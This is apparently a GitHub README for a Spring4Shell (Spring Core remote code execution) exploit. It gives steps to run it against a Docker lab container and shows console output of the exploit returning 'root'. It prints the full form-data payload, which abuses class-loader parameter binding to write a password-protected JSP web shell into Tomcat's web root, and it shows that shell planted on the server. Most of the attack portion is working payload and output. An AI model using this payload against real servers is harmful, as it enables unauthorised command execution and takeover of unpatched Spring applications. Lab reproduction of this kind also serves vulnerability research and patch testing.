# spring-core-rce

### How to reproduce

1. `docker run -d -p 8082:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29`
2. `python python spring-core-rce-exp.py --url "http://127.0.0.1:8082"`
3. check the console output

```shell
D:\Downloads>python spring-core-rce-exp.py --url "http://127.0.0.1:8082"
The vulnerability exists, the shell address is :http://127.0.0.1:8082/tomcatwar.jsp?pwd=j&cmd=whoami
got response:

D:\Downloads>python spring-core-rce-exp.py --url "http://127.0.0.1:8082"
The vulnerability exists, the shell address is :http://127.0.0.1:8082/tomcatwar.jsp?pwd=j&cmd=whoami
got response: root

//
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } -


D:\Downloads>
```

### Some details

The key form data send to the server is the following.

```data
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i 
if ("j".equals(request.getParameter("pwd"))) {
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    while ((a = in .read(b)) != -1) {
        out.println(new String(b));
    }
}
%{suffix}i
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

And you can see a new file is created in the server.

```shell
┌──(liudonghua㉿DESKTOP-DELL)-[/mnt/c/Users/Liu.D.H]
└─$ docker exec -it 14a0ced28ebe bash
[root@14a0ced28ebe /]# ls -l /app/tomcat/webapps/ROOT
total 16
drwxr-x--- 3 root root 4096 Mar 31 02:48 META-INF
drwxr-x--- 5 root root 4096 Mar 31 02:48 WEB-INF
drwxr-x--- 3 root root 4096 Mar 31 02:48 org
-rw-r----- 1 root root  976 Mar 31 03:25 tomcatwar.jsp
[root@14a0ced28ebe /]# cd /app/tomcat/webapps/ROOT
[root@14a0ced28ebe ROOT]# cat tomcatwar.jsp
<% if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %>//
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } -
<% if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %>//
- if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = -.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } -
[root@14a0ced28ebe ROOT]#
```

### Spring-beans RCE Vulnerability Requirements

- JDK9 and above;
- Using the Spring-beans package;
- Spring parameter binding is used;
- Spring parameter binding uses non-basic parameter types, such as general POJOs;

### References

1. [Spring4Shell Details and Exploit Analysis](https://www.cyberkendra.com/2022/03/spring4shell-details-and-exploit-code.html)
4. [Spring R-C-E 漏-洞](https://mp.weixin.qq.com/s?__biz=MzkyNjE2OTE4MA%3D%3D&chksm=c23a20a2f54da9b491f39019f83af8d6acdbfa8a788c38ce15e0e8ef3ba11c0a42b80eecfbc4&idx=1&lang=zh_CN&mid=2247483793&sn=2456c4dedc923a914d8d4ceb768c3ca2&token=344118411#rd)
2. [https://github.com/Mr-xn/spring-core-rce](https://github.com/Mr-xn/spring-core-rce)
3. [https://github.com/mcdulltii/SpringShell_0-day](https://github.com/mcdulltii/SpringShell_0-day)

